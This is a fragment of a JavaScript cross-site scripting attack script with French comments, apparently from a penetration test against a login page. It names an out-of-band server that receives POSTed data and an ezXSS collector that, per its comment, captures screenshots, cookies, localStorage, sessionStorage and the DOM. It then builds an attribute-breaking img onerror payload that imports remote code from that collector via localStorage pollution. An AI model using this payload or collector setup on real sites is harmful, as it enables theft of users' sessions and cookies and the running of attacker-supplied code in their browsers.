(function () {
    ...
    var OOB   = 'https://o.g6g.fr/coucou'; // Collaborator/OOB : reçoit le POST
    var EZXSS = 'https://g.g6g.fr';              // ezXSS collector un import de la recupere toutes els infos de la page : impression ecran + localstorage + cookies + session storage + DOM
    var RUN   = 'esc-login-xss';                 // marqueur pour filtrer les logs
    // =========================================================================
    ...
    try {
        var msPayload =   `"><img src=//o.g6g.fr/pingSrcFromMultiSearch onerror="alert(\'2eme_exec_js_ici_grace_au_local_storage_pollution sur ${document.domain} + exec ezxss\');import(\'//g.g6g.fr\');">`;
